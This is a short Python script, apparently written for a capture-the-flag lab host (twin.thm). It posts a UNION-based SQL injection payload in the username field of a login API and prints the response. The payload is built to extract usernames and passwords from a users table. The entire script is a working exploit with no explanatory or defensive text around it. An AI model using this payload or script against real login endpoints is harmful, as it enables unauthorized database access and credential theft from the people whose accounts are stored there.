#!/usr/bin/env python3 
import requests

url = 'http://twin.thm/api/login'
q1 = "1' union select username, password from users-- -"
q2 = "anything"
data = {
        "username": q1, 
        "password": q2
        }
s = requests.post(url, data=data)
print(s.text)
